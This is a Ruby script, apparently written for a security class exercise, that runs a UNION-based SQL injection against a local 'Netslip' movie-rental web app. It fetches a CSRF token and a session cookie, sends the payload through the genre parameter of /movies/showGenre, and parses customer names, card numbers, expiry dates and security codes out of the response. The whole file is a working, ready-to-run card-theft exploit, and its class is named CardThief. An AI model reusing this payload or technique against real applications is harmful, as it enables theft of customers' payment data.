require 'socket'
require 'cgi'

class CreditCard
	attr_reader :customer_name, :card_number, :exp_month, :exp_year, :sec_code

	def initialize(args)
		@customer_name = args[:customer_name]
		@card_number = args[:card_number]
		@exp_month = args[:exp_month]
		@exp_year = args[:exp_year]
		@sec_code = args[:sec_code]
	end
end

class CardThief

	#### Public interface ####

	public

	def initialize
		@@host = "localhost"
		@@port = 3000
	end

	# This method prints out the credit card info for each credit card stored
	# in the Netslip customer database table
	def printCreditCardInfo()
		stealCreditCardInfo().each_with_index do |card, i|
			puts "Card #" + i.to_s + "\n"
			puts "Customer Name:\t\t" + card.customer_name
			puts "Credit Card Number:\t" + card.card_number
			puts "Expiration date:\t" + card.exp_month + "/" + card.exp_year
			puts "3-digit security code:\t" + card.sec_code + "\n\n"
		end
	end


	##### Private helper methods #####

	private 

	# This method returns an array of CreditCard objects.
	#
	# It calls fetchRawCreditCardInfo to get the raw
	# info from the Netslip server, parses out the credit card
	# info into an array of CreditCard objects.
	def stealCreditCardInfo()
		card_info_regex = /<td><a href="\/movies\/rent\/\d+">(.*)<\/a><\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>\n *<td>([0-9]*)<\/td>/

		raw_card_info = fetchRawCreditCardInfo()
		
		# parse out credit card information from the raw HTTP response and put
		# it into the customer_info array. Each credit card's info is stored
		# into cutomer_info as an array of size 5:
		#    first item is the customer name, 
		#    second item is the credit card number, 
		#    third item is the expiration month, 
		#    fourth item is the expiration year, 
		#    fifth item is the 3-digit security code, 
		nice_card_info = []

		raw_card_info.scan(card_info_regex) do |c|
			card_info = {customer_name: c[0], card_number: c[1], exp_month: c[2], exp_year: c[3], sec_code: c[4]}
			nice_card_info << CreditCard.new(card_info)
		end
		
		return nice_card_info
	end

	# This function returns the raw HTTP response with the credit card
	# information from the NetSlip server.
	def fetchRawCreditCardInfo
		# This is the payload for the SQL query. This is the heart of the SQL injection attack
		# Basically it closes off the ongoing query and inserts a query for the credit cards in the middle.
		# UNION makes sure we get the results for all of these queries together. Note that by putting the
		# condition 1=0 the queries surrounding the credit card query we make sure that these don't return 
		# any results and we only get the credit card results.
		egg = "' AND 1=0 UNION SELECT billing_street, name, card_number, exp_month, exp_year, security_code, billing_city FROM customers UNION SELECT * FROM movies WHERE 1=0 AND genre='"

	    # get the CSRF auth token and the session cookie to put into the POST request
		token_and_cookie = getAuthTokenAndSessionCookie()
		auth_token = token_and_cookie[0]; session_cookie = token_and_cookie[1];

	    # put the authenticity token as well as the SQL injection payload 
	    # as url encoded parameters to the HTTP POST request 
		request_body = "authenticity_token=" + CGI::escape(auth_token) + "&" \
		   "genre=" + CGI::escape(egg) + "&" \
		   "commit=Show+Movies\r\n\r\n"

		# construct the full HTTP POST request for the showGenre action in the movies_controller
		# this is the action that has the vulnerability
		http_request = "POST /movies/showGenre HTTP/1.1\r\n" \
			  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
			  "Connection: close\r\n" \
			  "Content-Type: application/x-www-form-urlencoded\r\n" \
			  "Content-Length: " + request_body.size.to_s + "\r\n" \
			  "Cookie: _session_id=" + session_cookie + "\r\n" \
			  "\r\n"
		http_request += request_body

		# send HTTP request and get response 		  
		s = TCPSocket.open(@@host, @@port)
		s.puts http_request
		http_response = s.read

		return http_response
	end

	def getAuthTokenAndSessionCookie
		auth_token_regex = /<input name="authenticity_token" type="hidden" value="(.*)" \/>/ 
		session_cookie_regex = /^Set-Cookie: _session_id=([a-zA-Z0-9]*);/

		# HTTP request for select genre page
		http_request = "GET /movies/selectGenre HTTP/1.1\r\n" \
				  "Connection: close\r\n" \
				  "Host: " + @@host + ":" + @@port.to_s + "\r\n" \
				  "\r\n"

		# send HTTP request and get response 		  
		s = TCPSocket.open(@@host, @@port)
		s.puts http_request
		http_response = s.read

		# parse out the CSRF authenticity token and the unauthenticated session cookie
		auth_token = (http_response =~ auth_token_regex) ? $1 : nil
		session_cookie = (http_response =~ session_cookie_regex) ? $1 : nil

		return [auth_token, session_cookie]
	end

end


t = CardThief.new()
t.printCreditCardInfo()
